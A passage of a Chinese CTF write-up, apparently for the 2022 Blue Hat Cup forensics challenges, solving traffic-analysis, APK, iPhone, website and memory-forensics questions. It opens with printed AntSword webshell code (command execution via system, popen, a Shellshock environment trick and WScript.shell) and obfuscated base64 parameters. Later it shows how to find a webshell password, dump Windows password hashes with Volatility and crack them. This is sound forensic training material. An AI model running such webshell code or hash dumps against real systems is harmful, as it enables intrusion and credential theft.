+<span class="line" data-line="73"><span style="color:#79B8FF">                putenv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"PHP_LOL=() { x; }; </span><span style="color:#E1E4E8">$c</span><span style="color:#9ECBFF"> ></span><span style="color:#E1E4E8">$tmp</span><span style="color:#9ECBFF"> 2>&#x26;1"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="74"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'error_log'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="75"><span style="color:#79B8FF">                    error_log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"a"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="76"><span style="color:#E1E4E8">                } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="77"><span style="color:#79B8FF">                    mail</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"a@127.0.0.1"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"-bv"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="78"><span style="color:#E1E4E8">                }</span></span>
+<span class="line" data-line="79"><span style="color:#E1E4E8">            } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="80"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="81"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="82"><span style="color:#E1E4E8">            $output </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">file_get_contents</span><span style="color:#E1E4E8">($tmp);</span></span>
+<span class="line" data-line="83"><span style="color:#F97583">            @</span><span style="color:#79B8FF">unlink</span><span style="color:#E1E4E8">($tmp);</span></span>
+<span class="line" data-line="84"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> ($output </span><span style="color:#F97583">!=</span><span style="color:#9ECBFF"> ""</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="85"><span style="color:#79B8FF">                print</span><span style="color:#E1E4E8"> ($output);</span></span>
+<span class="line" data-line="86"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> True</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="87"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="88"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="89"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="90"><span style="color:#E1E4E8">    };</span></span>
+<span class="line" data-line="91"><span style="color:#F97583">    function</span><span style="color:#B392F0"> runcmd</span><span style="color:#E1E4E8">($c) {</span></span>
+<span class="line" data-line="92"><span style="color:#E1E4E8">        $ret </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="93"><span style="color:#E1E4E8">        $d </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> dirname</span><span style="color:#E1E4E8">($_SERVER[</span><span style="color:#9ECBFF">"SCRIPT_FILENAME"</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="94"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'system'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="95"><span style="color:#F97583">            @</span><span style="color:#79B8FF">system</span><span style="color:#E1E4E8">($c, $ret);</span></span>
+<span class="line" data-line="96"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'passthru'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="97"><span style="color:#F97583">            @</span><span style="color:#79B8FF">passthru</span><span style="color:#E1E4E8">($c, $ret);</span></span>
+<span class="line" data-line="98"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'shell_exec'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="99"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">@</span><span style="color:#79B8FF">shell_exec</span><span style="color:#E1E4E8">($c));</span></span>
+<span class="line" data-line="100"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'exec'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="101"><span style="color:#F97583">            @</span><span style="color:#79B8FF">exec</span><span style="color:#E1E4E8">($c, $o, $ret);</span></span>
+<span class="line" data-line="102"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">join</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span></span>
+<span class="line" data-line="103"><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, $o));</span></span>
+<span class="line" data-line="104"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'popen'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="105"><span style="color:#E1E4E8">            $fp </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">popen</span><span style="color:#E1E4E8">($c, </span><span style="color:#9ECBFF">'r'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="106"><span style="color:#F97583">            while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!@</span><span style="color:#79B8FF">feof</span><span style="color:#E1E4E8">($fp)) {</span></span>
+<span class="line" data-line="107"><span style="color:#79B8FF">                print</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">@</span><span style="color:#79B8FF">fgets</span><span style="color:#E1E4E8">($fp, </span><span style="color:#79B8FF">2048</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="108"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="109"><span style="color:#F97583">            @</span><span style="color:#79B8FF">pclose</span><span style="color:#E1E4E8">($fp);</span></span>
+<span class="line" data-line="110"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'proc_open'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="111"><span style="color:#E1E4E8">            $p </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">proc_open</span><span style="color:#E1E4E8">($c, </span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> =></span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'pipe'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'w'</span><span style="color:#E1E4E8">), </span><span style="color:#79B8FF">2</span><span style="color:#F97583"> =></span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'pipe'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'w'</span><span style="color:#E1E4E8">)), $io);</span></span>
+<span class="line" data-line="112"><span style="color:#F97583">            while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!@</span><span style="color:#79B8FF">feof</span><span style="color:#E1E4E8">($io[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">])) {</span></span>
+<span class="line" data-line="113"><span style="color:#79B8FF">                print</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">@</span><span style="color:#79B8FF">fgets</span><span style="color:#E1E4E8">($io[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">], </span><span style="color:#79B8FF">2048</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="114"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="115"><span style="color:#F97583">            while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!@</span><span style="color:#79B8FF">feof</span><span style="color:#E1E4E8">($io[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">])) {</span></span>
+<span class="line" data-line="116"><span style="color:#79B8FF">                print</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">@</span><span style="color:#79B8FF">fgets</span><span style="color:#E1E4E8">($io[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">], </span><span style="color:#79B8FF">2048</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="117"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="118"><span style="color:#F97583">            @</span><span style="color:#79B8FF">fclose</span><span style="color:#E1E4E8">($io[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="119"><span style="color:#F97583">            @</span><span style="color:#79B8FF">fclose</span><span style="color:#E1E4E8">($io[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="120"><span style="color:#F97583">            @</span><span style="color:#79B8FF">proc_close</span><span style="color:#E1E4E8">($p);</span></span>
+<span class="line" data-line="121"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'antsystem'</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="122"><span style="color:#F97583">            @</span><span style="color:#B392F0">antsystem</span><span style="color:#E1E4E8">($c);</span></span>
+<span class="line" data-line="123"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">runshellshock</span><span style="color:#E1E4E8">($d, $c)) {</span></span>
+<span class="line" data-line="124"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> $ret;</span></span>
+<span class="line" data-line="125"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($d, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!=</span><span style="color:#9ECBFF"> "/"</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">class_exists</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"COM"</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="126"><span style="color:#E1E4E8">            $w </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> COM</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'WScript.shell'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="127"><span style="color:#E1E4E8">            $e </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $w</span><span style="color:#F97583">-></span><span style="color:#B392F0">exec</span><span style="color:#E1E4E8">($c);</span></span>
+<span class="line" data-line="128"><span style="color:#E1E4E8">            $so </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $e</span><span style="color:#F97583">-></span><span style="color:#B392F0">StdOut</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="129"><span style="color:#E1E4E8">            $ret</span><span style="color:#F97583">.=</span><span style="color:#E1E4E8"> $so</span><span style="color:#F97583">-></span><span style="color:#B392F0">ReadAll</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="130"><span style="color:#E1E4E8">            $se </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $e</span><span style="color:#F97583">-></span><span style="color:#B392F0">StdErr</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="131"><span style="color:#E1E4E8">            $ret</span><span style="color:#F97583">.=</span><span style="color:#E1E4E8"> $se</span><span style="color:#F97583">-></span><span style="color:#B392F0">ReadAll</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="132"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8"> ($ret);</span></span>
+<span class="line" data-line="133"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="134"><span style="color:#E1E4E8">            $ret </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 127</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="135"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="136"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> $ret;</span></span>
+<span class="line" data-line="137"><span style="color:#E1E4E8">    };</span></span>
+<span class="line" data-line="138"><span style="color:#E1E4E8">    $ret </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#B392F0">runcmd</span><span style="color:#E1E4E8">($r </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> " 2>&#x26;1"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="139"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8"> ($ret </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">?</span><span style="color:#9ECBFF"> "ret={</span><span style="color:#E1E4E8">$ret</span><span style="color:#9ECBFF">}"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> ""</span><span style="color:#E1E4E8">;;</span></span>
+<span class="line" data-line="140"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="141"><span style="color:#F97583">catch</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">Exception</span><span style="color:#E1E4E8"> $e) {</span></span>
+<span class="line" data-line="142"><span style="color:#79B8FF">    echo</span><span style="color:#9ECBFF"> "ERROR://"</span><span style="color:#F97583"> .</span><span style="color:#E1E4E8"> $e</span><span style="color:#F97583">-></span><span style="color:#B392F0">getMessage</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="143"><span style="color:#E1E4E8">};</span></span>
+<span class="line" data-line="144"><span style="color:#B392F0">asoutput</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="145"><span style="color:#F97583">die</span><span style="color:#E1E4E8">(); </span></span>
+<span class="line" data-line="146"><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF">p48a6d55fac1b1</span><span style="color:#F97583">=</span><span style="color:#79B8FF">Tw</span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF">q8fb9d4c082c11</span><span style="color:#F97583">=</span><span style="color:#79B8FF">YNY2QgL2QgImM6XFxXaW5kb3dzXFxUZW1wIiZyYXIuZXhlIGEgLVBTZWNyZXRzUGFzc3cwcmRzIDEucmFyIDEudHh0JmVjaG8gZWZhOTIzYmE1MDQmY2QmZWNobyAxYTRiZTg4MTVlZjg</span><span style="color:#F97583">=&#x26;</span><span style="color:#79B8FF">yee092cda97a62</span><span style="color:#F97583">=</span><span style="color:#79B8FF">6iY21k</span></span></code></pre>
+<p>发现拼接了三个<code>$_POST</code> 的参数 <code>p48a6d55fac1b1</code>、<code>q8fb9d4c082c11</code> 和 <code>yee092cda97a62</code>，拼接一下这三个参数的值</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>TwYNY2QgL2QgImM6XFxXaW5kb3dzXFxUZW1wIiZyYXIuZXhlIGEgLVBTZWNyZXRzUGFzc3cwcmRzIDEucmFyIDEudHh0JmVjaG8gZWZhOTIzYmE1MDQmY2QmZWNobyAxYTRiZTg4MTVlZjg6iY21k</span></span></code></pre>
+<p><code>base64</code> 解码后得到</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O</span></span>
+<span class="line" data-line="2"><span>cd /d "c:\\Windows\\Temp"&#x26;rar.exe a -PSecretsPassw0rds 1.rar 1.txt&#x26;echo efa923ba504&#x26;cd&#x26;echo 1a4be8815ef8:</span></span></code></pre>
+<p>至此我们得到 <code>1.rar</code> 的解压密码 <code>SecretsPassw0rds</code>，解压后得到机器的 <code>hash</code> 为 <code>416f89c3a5deb1d398a1a1fce93862a7</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709185655917.png" alt="image-20220709185655917"></p>
+<h2 id="电子取证">电子取证</h2>
+<h3 id="程序分析_1">程序分析_1</h3>
+<blockquote>
+<p>现已获取某个APP程序，请您对以下问题进行分析解答。</p>
+<p>本程序包名是？（答案参考格式：abc.xx.de）</p>
+</blockquote>
+<p>直接 <code>Jadx</code> 打开，在 <code>AndroidMainfest.xml</code> 里面找到包名 <code>exec.azj.kny.d.c</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709182414616.png" alt="image-20220709182414616"></p>
+<h3 id="程序分析_2">程序分析_2</h3>
+<blockquote>
+<p>本程序的入口是？（答案参考格式：abc.xx.de）</p>
+</blockquote>
+<p>入口肯定是 <code>Main</code>，我们直接找到 <code>Main</code>，得到入口 <code>minmtta.hemjcbm.ahibyws.MainActivity</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709182527621.png" alt="image-20220709182527621"></p>
+<h3 id="程序分析_3">程序分析_3</h3>
+<blockquote>
+<p>本程序的服务器地址的密文是？（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>在 <code>程序分析_2</code> 中得到的入口中得到一段 <code>base64</code> 编码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line" data-line="1"><span style="color:#F97583">return</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> String</span><span style="color:#E1E4E8">(Base64.</span><span style="color:#B392F0">decode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">), </span><span style="color:#9ECBFF">"utf-8"</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<p>解密后得到一段地址，所以说这段 <code>base64</code> 编码肯定就是flag了。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>https://ansjk.ecxeio.xyz</span></span></code></pre>
+<h3 id="手机取证_1">手机取证_1</h3>
+<blockquote>
+<p>现对一个苹果手机进行取证，请您对以下问题进行分析解答。</p>
+<p>627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）</p>
+</blockquote>
+<p>打开 <code>盘古石阅读器</code> ，直接在左上角 <code>搜索</code> 中搜索 <code>627604C2-C586-48C1-AA16-FF33C3022159.PNG</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709183106264.png" alt="image-20220709183106264"></p>
+<p>成功检索到该文件，我们选择图片然后右键导出</p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709183045710.png" alt="image-20220709183045710"></p>
+<p>得到分辨率 <code>360x360</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709183208195.png" alt="image-20220709183208195"></p>
+<h3 id="手机取证_2">手机取证_2</h3>
+<blockquote>
+<p>姜总的快递单号是多少？（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>和 <code>手机取证_1</code> 同样的操作， <code>搜索</code>  框里搜索 <code>单号</code> 得到 <code>SF1142358694796</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709183340600.png" alt="image-20220709183340600"></p>
+<h3 id="网站取证_1">网站取证_1</h3>
+<blockquote>
+<p>据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p>
+<p>请从网站源码中找出木马文件，并提交木马连接的密码。（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>直接 <code>D盾</code> 扫描得到 <code>runtime\temp\0f71e181346d43e56722aec663e5d4e9.php</code> 一句话木马，连接密码 <code>lanmaobei666</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709183821066.png" alt="image-20220709183821066"></p>
+<h3 id="网站取证_2">网站取证_2</h3>
+<blockquote>
+<p>请提交数据库连接的明文密码。（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>一看目录结构就知道是 <code>ThinkPHP</code> ，直接查看 <code>application/database.php</code> 文件，不过这里是调用了自定义 <code>my_encrypt()</code> 函数</p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184031264.png" alt="image-20220709184031264"></p>
+<p>我们直接在文件夹内搜索 <code>my_encrypt</code> 得到 <code>application\encrypt\encrypt.php</code>，直接 <code>var_dump(my_encrypt());</code> 调用该函数输出数据库密码。</p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184249725.png" alt="image-20220709184249725"></p>
+<h3 id="网站取证_3">网站取证_3</h3>
+<blockquote>
+<p>请提交数据库金额加密混淆使用的盐值。（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>既然是金额，我们直接搜索 <code>money</code> 得到 <code>application\admin\controller\Channelorder.php</code> 发现调用了自定义函数 <code>encrypt()</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184423422.png" alt="image-20220709184423422"></p>
+<p>我们直接在文件夹内搜索 <code>encrypt</code> 得到 <code>application\admin\controller\Channelorder.php</code>，加密混淆使用的盐值为 <code>jyzg123456</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184532211.png" alt="image-20220709184532211"></p>
+<h3 id="计算机取证_1">计算机取证_1</h3>
+<blockquote>
+<p>现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p>
+<p>从内存镜像中获得taqi7的开机密码是多少？（答案参考格式：abcABC123）</p>
+<p>附件下载地址见平台公告，解压密码为93ce7ea39bdd7baa137f1e9b963b7ee5</p>
+</blockquote>
+<p>我们先自动分析内存所属的操作系统和版本</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>.\volatility.exe -f E:\BaiduNetdiskDownload\计算机取证\1.dmp imageinfo</span></span></code></pre>
+<p>然后在查看镜像里的win7密码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>.\volatility.exe -f E:\BaiduNetdiskDownload\计算机取证\1.dmp  --profile=Win7SP1x64 hashdump</span></span></code></pre>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709215858796.png" alt="image-20220709215858796"></p>
+<p>得到 <code>hash</code> 密码 <code>7f21caca5685f10d9e849cc84c340528</code>，使用cmd5解密后得到 <code>anxinqi</code></p>
+<h3 id="计算机取证_2">计算机取证_2</h3>
+<blockquote>
+<p>制作该内存镜像的进程Pid号是多少？（答案参考格式：1024）</p>
+</blockquote>
+<p>直接列出进程列表</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>.\volatility.exe -f E:\BaiduNetdiskDownload\计算机取证\1.dmp  --profile=Win7SP1x64 pslist</span></span></code></pre>
+<p>看到 <code>MagnetRAMCaptu</code> 的 <code>Pid</code> 为 <code>2192</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709222143093.png" alt="image-20220709222143093"></p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 space-y-2 relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/bluehatcup-2022/index.html" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all"> https://5ime.cn/bluehatcup-2022/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:text-blue-800">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>   </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.CxRYfcJe.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2025 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const r=a.getElementsByTagName("img");Array.from(r).forEach((e,n)=>{e.alt||(e.alt=`文章配图 ${n+1}`);const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.setAttribute("aria-label",`查看大图：${e.alt}`),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script></body></html>
